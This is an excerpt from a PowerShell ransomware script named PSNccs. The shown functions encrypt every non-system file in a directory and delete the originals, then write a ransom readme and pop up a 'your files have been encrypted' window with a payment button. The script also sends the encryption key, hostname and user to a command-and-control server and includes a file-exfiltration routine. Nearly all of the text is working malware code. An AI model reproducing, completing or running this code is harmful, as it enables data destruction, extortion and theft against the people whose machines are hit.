...
$Host.UI.RawUI.WindowTitle = "PSNccs - by @DARK-SHADOW" 
...
function Show-Banner {
   ...
   # Write-Host                                                            
   Write-Host "  ----------------- by @DARK-SHADOW ----------------  " -ForegroundColor Green }
...
function Show-Help {
   ...
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSNccs.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   ...
   Write-Host ; Write-Host "        .\PSNccs.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
      ...
      switch ($Mode) {
         ...
         "Decrypt" {
             ...
             if ($Path) {
                ...
                $outPath = $File.FullName.replace(".nccs","") }
...
Invoke-WebRequest -useb https://raw.githubusercontent.com/DARK-SHADOW/PSNccs/main/Demo/PSNccs.jpg -Outfile $env:temp\PSNccs.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/DARK-SHADOW/PSNccs/main/Demo/PSNccs.ico -Outfile $env:temp\PSNccs.ico
...
$form.Text = "PSNccs by @DARK-SHADOW - https://github.com/DARK-SHADOW/PSNccs"
$formIcon = New-Object system.drawing.icon ("$env:temp\PSNccs.ico") 
$form.Icon = $formicon  

$img = [System.Drawing.Image]::Fromfile("$env:temp\PSNccs.jpg")
...
$label.Text = "All your files have been encrypted by PSNccs!" 
$label.AutoSize = $true 
...
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'PSNccs Payment System',
...
Remove-Item $env:temp\PSNccs* -force
...
function SendResults {
   $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $nccsKey ; $B64Key = R64Encoder -t $DESKey
   $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSNccs!" -NotMatch
...
function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by PSNccs!`nBut don't worry, you can still recover them with the recovery key :)`n"
   if (!(Test-Path "$Directory$slash$Readme")) { Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $nccsKey `n" }}

function EncryptFiles { 
   $ExcludedFiles = '*.nccs', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   ...
   Invoke-AESEncryption -Mode Encrypt -Key $nccsKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSNccs!" -NotMatch ; if (!$RansomLogs) { 
...
function ExfiltrateFiles {
   ...
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.nccs | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
...
function DecryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.nccs | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $nccsKey -Path $i ; $rfile = $i.replace(".nccs","")
      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.nccs ; if ($RFiles) { $RFiles | Remove-Item } else {
...
if ($Mode -eq "-d") { 
   ...
   $nccsKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
